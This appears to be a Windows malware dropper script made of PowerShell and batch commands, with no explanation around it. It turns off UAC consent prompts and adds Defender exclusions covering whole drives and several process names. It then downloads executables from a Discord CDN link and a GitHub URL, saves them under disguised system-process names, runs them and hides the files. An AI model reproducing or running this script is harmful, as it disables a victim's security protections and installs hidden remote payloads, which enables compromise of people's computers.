powershell.exe Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".tmp"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "svchost.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "F:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "D:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "E:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "server.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "RuntimeBroker.exe"

powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://cdn.discordapp.com/attachments/1181256494134603869/1187422462321885405/RuntimeBroker.exe -OutFile $env:localappdata\Microsoft\svchost.exe" 2>nul
powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\svchost.exe" 2>nul

powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://github.com/xZeRys/sal/raw/main/RuntimeBroker.exe -OutFile $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul
powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul

attrib +h %localappdata%\Microsoft\svchost.exe
attrib +h %localappdata%\Microsoft\RuntimeBroker.exe
